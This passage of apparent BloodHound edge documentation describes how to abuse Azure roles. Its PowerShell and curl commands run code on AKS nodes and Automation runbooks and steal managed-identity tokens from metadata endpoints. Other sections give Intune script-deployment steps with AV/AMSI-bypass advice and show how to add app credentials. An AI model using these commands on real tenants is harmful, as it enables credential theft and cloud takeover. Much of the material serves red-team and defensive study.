<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>PS /Users/andyrobbins&gt; $SPToken = Get-MSGraphToken `
-ClientID &quot;4d31...&quot; `
-ClientSecret &quot;odg8Q~...&quot; `
-TenantName &quot;contoso.onmicrosoft.com&quot;

PS /Users/andyrobbins&gt; $SPToken.access_token
eyJ0eXAiOiJKV1QiLCJub...
</pre></div>
</div>
<p>Now you can use this JWT to perform actions against any other MS
Graph endpoint as the service principal, continuing your attack
path with the privileges of that service principal.</p>
</section>
<section id="id100">
<h3>Opsec Considerations<a class="headerlink" href="#id100" title="Link to this heading"></a></h3>
<p>When you create a new secret for an App or Service Principal,
Azure creates an event called “Update application - Certificates
and secrets management”. This event describes who added the secret
to which application or service principal.</p>
</section>
<section id="id101">
<h3>References<a class="headerlink" href="#id101" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5">https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes">https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azakscontributor">
<h2>AZAKSContributor<a class="headerlink" href="#azakscontributor" title="Link to this heading"></a></h2>
<p>The Azure Kubernetes Service Contributor role grants full control
of the target Azure Kubernetes Service Managed Cluster. This includes
the ability to remotely fetch administrator credentials for the cluster
as well as the ability to execute arbitrary commands on compute
nodes associated with the AKS Managed Cluster.</p>
<section id="id102">
<h3>Abuse Info<a class="headerlink" href="#id102" title="Link to this heading"></a></h3>
<p>You can use BARK’s Invoke-AzureRMAKSRunCommand function
to execute commands on compute nodes associated with the
target AKS Managed Cluster.</p>
<p>This function requires you to supply an Azure Resource Manager
scoped JWT associated with the principal that has the privilege
to execute commands on the cluster. There are several ways to
acquire a JWT. For example, you may use BARK’s
Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
by supplying a refresh token:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ARMToken = Get-ARMTokenWithRefreshToken `
    -RefreshToken &quot;0.ARwA6WgJJ9X2qk...&quot; `
    -TenantID &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Now you can use BARK’s Invoke-AzureRMAKSRunCommand function
to execute a command against the target AKS Managed Cluster.
For example, to run a simple “whoami” command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-AzureRMAKSRunCommand `
    -Token $ARMToken `
    -TargetAKSId &quot;/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster&quot; `
    -Command &quot;whoami&quot;
</pre></div>
</div>
<p>If the AKS Cluster or its associated Virtual Machine Scale Sets
have managed identity assignments, you can use BARK’s
Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the
managed identity Service Principal like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-AzureRMAKSRunCommand `
    -Token $ARMToken `
    -TargetAKSId &quot;/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster&quot; `
    -Command \&#39;curl -i -H &quot;Metadata: true&quot; &quot;http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&amp;api-version=2019-08-01&quot;\&#39;
</pre></div>
</div>
<p>If successful, the output will include a JWT for the managed identity
service principal.</p>
</section>
<section id="id103">
<h3>Opsec Considerations<a class="headerlink" href="#id103" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id104">
<h3>References<a class="headerlink" href="#id104" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
<li><p><a class="reference external" href="https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/">https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azappadmin">
<h2>AZAppAdmin<a class="headerlink" href="#azappadmin" title="Link to this heading"></a></h2>
<p>Principals with the Application Admin role can control tenant-resident apps.</p>
<section id="id105">
<h3>Abuse Info<a class="headerlink" href="#id105" title="Link to this heading"></a></h3>
<p>Create a new credential for the app, then authenticate to the tenant as the
app’s service principal, then abuse whatever privilege it is that the service
principal has.</p>
</section>
<section id="id106">
<h3>Opsec Considerations<a class="headerlink" href="#id106" title="Link to this heading"></a></h3>
<p>The Azure portal will create a log even whenever a new credential is created for a service principal.</p>
</section>
<section id="id107">
<h3>References<a class="headerlink" href="#id107" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azautomationcontributor">
<h2>AZAutomationContributor<a class="headerlink" href="#azautomationcontributor" title="Link to this heading"></a></h2>
<p>The Azure Automation Contributor role grants full control
of the target Azure Automation Account. This includes
the ability to execute arbitrary commands on the Automation
Account.</p>
<section id="id108">
<h3>Abuse Info<a class="headerlink" href="#id108" title="Link to this heading"></a></h3>
<p>You can use BARK’s New-AzureAutomationAccountRunBook and
Get-AzureAutomationAccountRunBookOutput functions to execute
arbitrary commands against the target Automation Account.</p>
<p>These functions require you to supply an Azure Resource Manager
scoped JWT associated with the principal that has the privilege
to add or modify and run Automation Account run books. There are
several ways to acquire a JWT. For example, you may use BARK’s
Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
by supplying a refresh token:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ARMToken = Get-ARMTokenWithRefreshToken `
    -RefreshToken &quot;0.ARwA6WgJJ9X2qk...&quot; `
    -TenantID &quot;contoso.onmicrosoft.com&quot;
</pre></div>
</div>
<p>Now you can use BARK’s New-AzureAutomationAccountRunBook function
to add a new runbook to the target Automation Account, specifying
a command to execute using the -Script parameter:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>New-AzureAutomationAccountRunBook `
    -Token $ARMToken `
    -RunBookName &quot;MyCoolRunBook&quot; `
    -AutomationAccountPath &quot;https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount&quot; `
    -Script &quot;whoami&quot;
</pre></div>
</div>
<p>After adding the new runbook, you must execute it and fetch its
output. You can do this automatically with BARK’s
Get-AzureAutomationAccountRunBookOutput function:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-AzureAutomationAccountRunBookOutput `
    -Token $ARMToken `
    -RunBookName &quot;MyCoolRunBook&quot; `
    -AutomationAccountPath &quot;https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount&quot;
</pre></div>
</div>
<p>If the Automation Account has a managed identity assignment, you can use
these two functions to retrieve a JWT for the service principal like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$Script = $tokenAuthURI = $env:MSI_ENDPOINT + &quot;?resource=https://graph.microsoft.com/&amp;api-version=2017-09-01&quot;; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{&quot;Secret&quot;=&quot;$env:MSI_SECRET&quot;} -Uri $tokenAuthURI; $tokenResponse.access_token
New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName &quot;MyCoolRunBook&quot; -AutomationAccountPath &quot;https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount&quot; -Script $Script
Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName &quot;MyCoolRunBook&quot; -AutomationAccountPath &quot;https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount&quot;
</pre></div>
</div>
<p>If successful, the output will include a JWT for the managed identity
service principal.</p>
</section>
<section id="id109">
<h3>Opsec Considerations<a class="headerlink" href="#id109" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id110">
<h3>References<a class="headerlink" href="#id110" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a">https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azaverecontributor">
<h2>AZAvereContributor<a class="headerlink" href="#azaverecontributor" title="Link to this heading"></a></h2>
<p>Any principal granted the Avere Contributor role, scoped to the
affected VM, can reset the built-in administrator password on the
VM.</p>
<section id="id111">
<h3>Abuse Info<a class="headerlink" href="#id111" title="Link to this heading"></a></h3>
<p>The Avere Contributor role allows you to run SYSTEM
commands on the VM</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azureruncommand">Invoke-AzureRunCommand</a></p></li>
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunmsbuild">Invoke-AzureRunMSBuild</a></p></li>
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram">Invoke-AzureRunProgram</a></p></li>
</ul>
</section>
<section id="id112">
<h3>Opsec Considerations<a class="headerlink" href="#id112" title="Link to this heading"></a></h3>
<p>Because you’ll be running a command as the SYSTEM user on the
Virtual Machine, the same opsec considerations for running malicious
commands on any system should be taken into account: command line
logging, PowerShell script block logging, EDR, etc.</p>
</section>
<section id="id113">
<h3>References<a class="headerlink" href="#id113" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/tactics/TA0008/">https://attack.mitre.org/tactics/TA0008/</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1021/">https://attack.mitre.org/techniques/T1021/</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor">https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azcloudappadmin">
<h2>AZCloudAppAdmin<a class="headerlink" href="#azcloudappadmin" title="Link to this heading"></a></h2>
<p>Principals with the Cloud App Admin role can control tenant-resident apps.</p>
<section id="id114">
<h3>Abuse Info<a class="headerlink" href="#id114" title="Link to this heading"></a></h3>
<p>Create a new credential for the app, then authenticate to the tenant as the
app’s service principal, then abuse whatever privilege it is that the service
principal has.</p>
</section>
<section id="id115">
<h3>Opsec Considerations<a class="headerlink" href="#id115" title="Link to this heading"></a></h3>
<p>The Azure portal will create a log even whenever a new credential is created for a service principal.</p>
</section>
<section id="id116">
<h3>References<a class="headerlink" href="#id116" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azcontains">
<h2>AZContains<a class="headerlink" href="#azcontains" title="Link to this heading"></a></h2>
<p>This indicates that the parent object contains the child object, such as a resource
group containing a virtual machine, or a tenant “containing” a subscription.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
<section id="azcontributor">
<h2>AZContributor<a class="headerlink" href="#azcontributor" title="Link to this heading"></a></h2>
<p>The contributor role grants almost all abusable privileges in all circumstances,
with some exceptions. Those exceptions are not collected by AzureHound.</p>
<section id="id117">
<h3>Abuse Info<a class="headerlink" href="#id117" title="Link to this heading"></a></h3>
<p>This depends on what the target object is:
* <strong>Key Vault:</strong> You can read secrets and alter access policies (grant yourself
access to read secrets)
* <strong>Automation Account:</strong> You can create a new runbook that runs as the Automation
Account, and edit existing runbooks. Runbooks can be used to authenticate as the
Automation Account and abuse privileges held by the Automation Account. If the
Automation Account is using a ‘RunAs’ account, you can gather the certificate used
to login and impersonate that account.
* <strong>Virtual Machine:</strong> Run SYSTEM commands on the VM</p>
</section>
<section id="id118">
<h3>Opsec Considerations<a class="headerlink" href="#id118" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in general Azure will
create a log event for each abuse.</p>
</section>
<section id="id119">
<h3>References<a class="headerlink" href="#id119" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/</a>
<a class="reference external" href="https://blog.netspi.com/azure-automation-accounts-key-stores/">https://blog.netspi.com/azure-automation-accounts-key-stores/</a>
<a class="reference external" href="https://blog.netspi.com/get-azurepasswords/">https://blog.netspi.com/get-azurepasswords/</a>
<a class="reference external" href="https://blog.netspi.com/attacking-azure-cloud-shell/">https://blog.netspi.com/attacking-azure-cloud-shell/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azexecutecommand">
<h2>AZExecuteCommand<a class="headerlink" href="#azexecutecommand" title="Link to this heading"></a></h2>
<p>Principals with the Intune Administrators role are able to
execute arbitrary PowerShell scripts on devices that are joined
to the Azure Active Directory tenant.</p>
<section id="id120">
<h3>Abuse Info<a class="headerlink" href="#id120" title="Link to this heading"></a></h3>
<p>First, have your PowerShell script ready to go and save it
somewhere as a PS1 file. Take all the necessary operational
security (opsec) and AMSI-bypass steps you want at this point,
keeping in mind the script will run as the SYSTEM user unless
you specify otherwise. Also keep in mind that the script will
be written to disk, so take whatever AV bypass measures you need
as well.</p>
<p>Next, log into the Azure web portal as the user with the “Intune
Administrator” role activated. After authenticating, access Endpoint
Manager at <a class="reference external" href="https://endpoint.microsoft.com">https://endpoint.microsoft.com</a>.</p>
<p>Click on “Devices” on the left, which takes you, unsurprisingly, to
the devices overview. Click on “Scripts” under the “Policy” section
to go to the scripts management page. Click “Add,” then click “Windows
10”.</p>
<p>This will bring you to the “Add Powershell Script” page. On this first
page, you’ll enter a name for the script and a brief description. On the
next page, click the folder and then select your PS1 from the common
dialogue window. You’ve now got three options to configure, but can
leave them all in the default “No” position. Most interestingly, keeping
the first selection as “No” will cause the script to run as the SYSTEM user.</p>
<p>Click next, and you’ll see the page that lets you scope which systems and
users this script will execute for. You can choose to assign the script to
“All devices,” “All users,” or “All users and devices.” If you leave the
“Assign to” dropdown at its default selection of “Selected groups,” you can
scope the script to only execute on systems or for users that belong to
certain security groups. The choice is yours: run the script on every
possible system or constrain it to only run on certain systems by scoping it
to existing security groups or by adding specific devices or users to new
security groups.</p>
<p>Click “Next” and you’ll see the review page which lets you see what you’re
about to do. Click “Add” and Azure will begin registering the script.
At this point, the script is now ready to run on your target systems. This
process works similarly to Group Policy, in that the Intune agent running
on each device periodically checks in (by default every hour) with
Intune/Endpoint Manager to see if there is a PowerShell script for it to run,
so you will need to wait up to an hour for your target system to actually pull
the script down and run it.</p>
</section>
<section id="id121">
<h3>Opsec Considerations<a class="headerlink" href="#id121" title="Link to this heading"></a></h3>
<p>When the Intune agent pulls down and executes PowerShell
scripts, a number of artifacts are created on the endpoint -
some permanent and some ephemeral.</p>
<p>Two files are created on the endpoint when a PowerShell script
is executed in the following locations:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>\<span class="n">Microsoft</span> <span class="n">Intune</span> <span class="n">Management</span> <span class="n">Extension</span>\<span class="n">Policies</span>\<span class="n">Scripts</span>
<span class="n">C</span><span class="p">:</span>\<span class="n">Program</span> <span class="n">files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>\<span class="n">Microsoft</span> <span class="n">Intune</span> <span class="n">Management</span> <span class="n">Extension</span>\<span class="n">Policies</span>\<span class="n">Results</span>
</pre></div>
</div>
<p>The file under the “Scripts” folder will be a local copy of the
PS1 stored in Azure, and the file under the “Results” folder
will be the output of the PS1; however, both of these files are
automatically deleted as soon as the script finishes running.
There are also permanent artifacts left over (assuming the
attacker doesn’t tamper with them). A full copy of the contents
of the PS1 can be found in this log file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">ProgramData</span>\<span class="n">Microsoft</span>\<span class="n">IntuneManagementExtension</span>\<span class="n">Logs</span>\<span class="n">_IntuneManagementExtension</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</section>
<section id="id122">
<h3>References<a class="headerlink" href="#id122" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://attack.mitre.org/tactics/TA0002/">https://attack.mitre.org/tactics/TA0002/</a></p></li>
<li><p><a class="reference external" href="https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d">https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azgetcertificates">
<h2>AZGetCertificates<a class="headerlink" href="#azgetcertificates" title="Link to this heading"></a></h2>
<p>The ability to read certificates from key vaults.</p>
<section id="id123">
<h3>Abuse Info<a class="headerlink" href="#id123" title="Link to this heading"></a></h3>
<p>Use PowerShell or PowerZure to fetch the certificate from the key vault.</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p>Get-AzureKeyVaultContent</p></li>
<li><p>Export-AzureKeyVaultcontent</p></li>
</ul>
</section>
<section id="id124">
<h3>Opsec Considerations<a class="headerlink" href="#id124" title="Link to this heading"></a></h3>
<p>Azure will create a new log event for the key vault whenever a secret is accessed.</p>
</section>
<section id="id125">
<h3>References<a class="headerlink" href="#id125" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/azure-automation-accounts-key-stores/">https://blog.netspi.com/azure-automation-accounts-key-stores/</a>
<a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azgetkeys">
<h2>AZGetKeys<a class="headerlink" href="#azgetkeys" title="Link to this heading"></a></h2>
<p>The ability to read keys from key vaults.</p>
<section id="id126">
<h3>Abuse Info<a class="headerlink" href="#id126" title="Link to this heading"></a></h3>
<p>Use PowerShell or PowerZure to fetch the certificate from the key vault.</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p>Get-AzureKeyVaultContent</p></li>
<li><p>Export-AzureKeyVaultcontent</p></li>
</ul>
</section>
<section id="id127">
<h3>Opsec Considerations<a class="headerlink" href="#id127" title="Link to this heading"></a></h3>
<p>Azure will create a new log event for the key vault whenever a secret is accessed.</p>
</section>
<section id="id128">
<h3>References<a class="headerlink" href="#id128" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/azure-automation-accounts-key-stores/">https://blog.netspi.com/azure-automation-accounts-key-stores/</a>
<a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azgetsecrets">
<h2>AZGetSecrets<a class="headerlink" href="#azgetsecrets" title="Link to this heading"></a></h2>
<p>The ability to read secrets from key vaults.</p>
<section id="id129">
<h3>Abuse Info<a class="headerlink" href="#id129" title="Link to this heading"></a></h3>
<p>Use PowerShell or PowerZure to fetch the certificate from the key vault.</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p>Get-AzureKeyVaultContent</p></li>
<li><p>Export-AzureKeyVaultcontent</p></li>
</ul>
</section>
<section id="id130">
<h3>Opsec Considerations<a class="headerlink" href="#id130" title="Link to this heading"></a></h3>
<p>Azure will create a new log event for the key vault whenever a secret is accessed.</p>
</section>
<section id="id131">
<h3>References<a class="headerlink" href="#id131" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/azure-automation-accounts-key-stores/">https://blog.netspi.com/azure-automation-accounts-key-stores/</a>
<a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent">https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azglobaladmin">
<h2>AZGlobalAdmin<a class="headerlink" href="#azglobaladmin" title="Link to this heading"></a></h2>
<p>This edge indicates the principal has the Global Admin role active against
the target tenant. In other words, the principal is a Global Admin. Global
Admins can do almost anything against almost every object type in the tenant,
this is the highest privilege role in Azure.</p>
<section id="id132">
<h3>Abuse Info<a class="headerlink" href="#id132" title="Link to this heading"></a></h3>
<p>As a Global Admin, you can change passwords, run commands on VMs, read key vault
secrets, activate roles for other users, etc.</p>
<p>For Global Admin to be able to abuse Azure resources, you must first grant yourself
the ‘User Access Administrator’ role in Azure RBAC. This is done through a toggle
button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges.</p>
<p>Once that role is applied to account, you can then add yourself as an Owner to all
subscriptions in the tenant</p>
</section>
<section id="id133">
<h3>Opsec Considerations<a class="headerlink" href="#id133" title="Link to this heading"></a></h3>
<p>This depends on exactly what you do, but in general Azure will log each abuse action.</p>
</section>
<section id="id134">
<h3>References<a class="headerlink" href="#id134" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://blog.netspi.com/attacking-azure-cloud-shell/">https://blog.netspi.com/attacking-azure-cloud-shell/</a></p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azhasrole">
<h2>AZHasRole<a class="headerlink" href="#azhasrole" title="Link to this heading"></a></h2>
<p>This edge indicates that a principal has been granted a particular
AzureAD admin role.</p>
<section id="id135">
<h3>Abuse Info<a class="headerlink" href="#id135" title="Link to this heading"></a></h3>
<p>No abuse is necessary. This edge only indicates
that the principal has been granted a particular
AzureAD admin role.</p>
</section>
<section id="id136">
<h3>Opsec Considerations<a class="headerlink" href="#id136" title="Link to this heading"></a></h3>
<p>The opsec considerations for a particular action authorized by a
principal&amp;ldquo;s active AzureAD role assignment will wholly depend
on what the action taken is. This edge does not capture all abusable
possibilities.</p>
</section>
<section id="id137">
<h3>References<a class="headerlink" href="#id137" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/graph/permissions-reference">https://docs.microsoft.com/en-us/graph/permissions-reference</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/azure/role-based-access-control/overview">https://docs.microsoft.com/en-us/azure/role-based-access-control/overview</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azkeyvaultcontributor">
<h2>AZKeyVaultContributor<a class="headerlink" href="#azkeyvaultcontributor" title="Link to this heading"></a></h2>
<p>The Key Vault Contributor role grants full control of the
target Key Vault. This includes the ability to read all secrets
stored on the Key Vault.</p>
<section id="id138">
<h3>Abuse Info<a class="headerlink" href="#id138" title="Link to this heading"></a></h3>
<p>You can read secrets and alter access policies (grant yourself access to read secrets)</p>
<p>Via PowerZure:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent">Get-AzureKeyVaultContent</a></p></li>
<li><p><a class="reference external" href="https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent">Export-AzureKeyVaultContent</a></p></li>
</ul>
</section>
<section id="id139">
<h3>Opsec Considerations<a class="headerlink" href="#id139" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id140">
<h3>References<a class="headerlink" href="#id140" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/azure-automation-accounts-key-stores/">https://blog.netspi.com/azure-automation-accounts-key-stores/</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/get-azurepasswords/">https://blog.netspi.com/get-azurepasswords/</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/attacking-azure-cloud-shell/">https://blog.netspi.com/attacking-azure-cloud-shell/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azlogicappcontributor">
<h2>AZLogicAppContributor<a class="headerlink" href="#azlogicappcontributor" title="Link to this heading"></a></h2>
<p>The Logic Contributor role grants full control
of the target Logic App. This includes the ability
to execute arbitrary commands on the Logic App.</p>
<section id="id141">
<h3>Abuse Info<a class="headerlink" href="#id141" title="Link to this heading"></a></h3>
<p>Currently you need access to the portal GUI to execute this abuse.
The abuse involves adding or modifying an existing logic app to coerce
the logic app into sending a JWT for its managed identity service principal
to a web server you control.</p>
<p>You can see a full walkthrough for executing that abuse in this blog post:
<a class="reference external" href="https://medium.com/p/52b29354fc54">Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps</a></p>
</section>
<section id="id142">
<h3>Opsec Considerations<a class="headerlink" href="#id142" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in
general Azure will create a log event for each abuse.</p>
</section>
<section id="id143">
<h3>References<a class="headerlink" href="#id143" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/BloodHoundAD/BARK">https://github.com/BloodHoundAD/BARK</a></p></li>
<li><p><a class="reference external" href="https://medium.com/p/52b29354fc54">https://medium.com/p/52b29354fc54</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="azmanagedidentity">
<h2>AZManagedIdentity<a class="headerlink" href="#azmanagedidentity" title="Link to this heading"></a></h2>
<p>Azure resources like Virtual Machines, Logic Apps, and Automation Accounts
can be assigned to either System- or User-Assigned Managed Identities.
This assignment allows the Azure resource to authenticate to Azure services
as the Managed Identity without needing to know the credential for that
Managed Identity. Managed Identities, whether System- or User-Assigned, are
AzureAD Service Principals.</p>
<section id="id144">
<h3>Abuse Info<a class="headerlink" href="#id144" title="Link to this heading"></a></h3>
<p>You can modify the Azure RM resource to execute actions against Azure with the
privileges of the Managed Identity Service Principal.</p>
<p>It is also possible to extract a JSON Web Token (JWT) for the Service Principal,
then use that JWT to authenticate as the Service Principal outside the scope of
the Azure RM resource. Here is how you extract the JWT using PowerShell:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$tokenAuthURI = $env:MSI_ENDPOINT + &quot;?resource=https://graph.microsoft.com/&amp;api-version=2017-09-01&quot;
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{&quot;Secret&quot;=&quot;$env:MSI_SECRET&quot;} -Uri $tokenAuthURI
$tokenResponse.access_token
</pre></div>
</div>
<p>We can then use this JWT to authenticate as the Service Principal to the Microsoft
Graph APIs using BARK for example.</p>
</section>
<section id="id145">
<h3>Opsec Considerations<a class="headerlink" href="#id145" title="Link to this heading"></a></h3>
<p>This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse.</p>
</section>
<section id="id146">
<h3>References<a class="headerlink" href="#id146" title="Link to this heading"></a></h3>
<ul class="simple">
